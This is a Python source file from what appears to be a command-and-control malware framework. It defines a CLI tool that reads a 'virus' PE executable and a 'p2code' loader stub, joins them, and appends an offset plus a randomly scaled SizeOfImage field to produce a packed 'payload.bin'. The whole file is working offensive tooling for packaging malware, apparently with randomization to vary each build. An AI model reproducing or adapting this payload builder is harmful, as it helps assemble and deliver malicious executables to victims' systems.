import pefile, random, os, sys

from c2.infra.tool_cli import ToolCLI
from c2.infra.cli_seed import CLISeed, DEFAULT_SEED_SIZE, textualize_seed
from c2.infra.seed_get_or_generate import seed_get_or_generate
from c2.common.sx import Sx

class CreatePayloadCLI(ToolCLI):
  def _initialize(self):
    self._progname = os.path.basename(__file__)

  def _setup_args(self):
    self._cli_seed = CLISeed(os.getcwd(), DEFAULT_SEED_SIZE)
    self._add_arg_processor(self._cli_seed)
    parser = self._parser
    parser.add_argument('-b', '--virus_file', required=True)
    parser.add_argument('-p', '--p2code_file', required=True)
    parser.add_argument('-o', '--out_file', required=True)
    parser.add_argument('--soi_mul_percent_sx', default='100..100', help='Multiply CachedSizeOfImage to percents')

  def _do_work(self):
    args = self._args
    #args.virus_file
    #args.p2code_file
    #args.out_file
    print(f'Reading VIRUS MZ FILE {args.virus_file}')
    virus_data = open(args.virus_file, 'rb').read()
    print(f'Virus data length: {len(virus_data)}')
    print()

    print(f'Reading p2code from file {args.p2code_file}')
    p2code_data = open(args.p2code_file, 'rb').read()
    print(f'p2code length: {len(p2code_data)}')
    print()

    if len(virus_data):
      pe = pefile.PE(args.virus_file, fast_load=True)
      cached_size_of_image = pe.OPTIONAL_HEADER.SizeOfImage
    else:
      print('MZ file is empty; SizeOfImage will be equal to P2code length')
      cached_size_of_image = len(p2code_data)

    seed = seed_get_or_generate(self._cli_seed, DEFAULT_SEED_SIZE)
    print(f'CreatePayloadCLI._do_work() using seed {textualize_seed(seed)}')
    rng = random.Random(seed)
    print(f'<{self._progname} rng probe: {rng.randint(0, sys.maxsize)}>')

    _sx = Sx(args.soi_mul_percent_sx, rng)
    _mul_percent = _sx.make_number()
    dwCachedSizeOfImage = (cached_size_of_image * _mul_percent) // 100
    print(f'dwCachedSizeOfImage   = 0x{dwCachedSizeOfImage:x} ({dwCachedSizeOfImage}) (NOTE: NOT aligned)')
    print(f'  Sx({args.soi_mul_percent_sx=}) -> {_mul_percent=}, {cached_size_of_image=}')


    print('Generating payload ...')

    # `offset` field will be placed at the end of the payload
    p2code_offset = len(virus_data)

    # payload must be DWORD aligned, pad is added to p2code
    payload_data = virus_data + p2code_data
    final_pad_len = 4 - (len(payload_data) % 4)
    print(f'adding final_pad {final_pad_len} bytes')
    final_pad = b' '*final_pad_len
    payload_data += final_pad
    payload_data += p2code_offset.to_bytes(4, 'little')
    payload_data += dwCachedSizeOfImage.to_bytes(4, 'little')

    print(f'payload_data size     = {len(payload_data)}')
    print(f'p2code_offset         = {p2code_offset}')

    # If we uncomment the next line, it will be possible to put multiple dll/exe/86/64 payload files, it doesnt make sense
    #payload_fname = f'payload.{payload_suffix}.bin'
    payload_fname = 'payload.bin'

    print(f'writing payload to {args.out_file}')
    open(args.out_file, 'wb').write(payload_data)

    print('Done creating default payload')


if __name__ == '__main__':
  CreatePayloadCLI(sys.argv[1:]).execute()



